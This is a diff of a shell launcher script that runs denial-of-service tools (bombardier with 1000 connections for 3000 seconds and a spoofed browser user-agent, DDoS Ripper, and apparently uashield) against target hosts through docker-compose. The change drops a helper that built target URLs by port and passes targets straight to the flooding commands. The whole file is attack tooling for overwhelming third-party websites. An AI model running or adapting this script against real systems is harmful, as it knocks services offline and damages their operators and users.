@@ -3,27 +3,6 @@
 BASEDIR=$(dirname "$0")
 cd $BASEDIR
 
-initTarget(){
-    export TARGET_PORT=$2
-    export R_TARGET_URL=$1
-    export RUN_RIPPER=1
-    scheme="http://"
-    updSuffix=""
-    if [ "$TARGET_PORT" -eq "443" ]
-    then
-        scheme="https://"
-    fi
-    if [ "$TARGET_PORT" -eq "53" ]
-    then
-        RUN_RIPPER=0
-        scheme=""
-        updSuffix="/UDP"
-    fi
-    export B_TARGET_URL="$scheme$R_TARGET_URL:$TARGET_PORT$updSuffix"
-    echo "R_TARGET_URL=$R_TARGET_URL,B_TARGET_URL=$B_TARGET_URL"
-    sudo git reset --hard
-    sudo git pull
-}
 compose(){
     . ./settings.sh
     sudo -E docker-compose "$@"
@@ -65,14 +44,12 @@ uashield() {
 }
 bombardier()
 {
-    initTarget $1 $2
-    run "bombardier" "-k -H \"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\" -c 1000 -d 3000s -l ${B_TARGET_URL}"
+    run "bombardier" "-k -H \"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\" -c 1000 -d 3000s -l " "$@"
 }
 ddosripper()
 {
-    initTarget $1 $2
     sudo -sE docker-compose build ddosripper
-    run "ddosripper" "$R_TARGET_URL $TARGET_PORT"
+    run "ddosripper" "$@"
 }
 checksites(){
     compose pull checksites
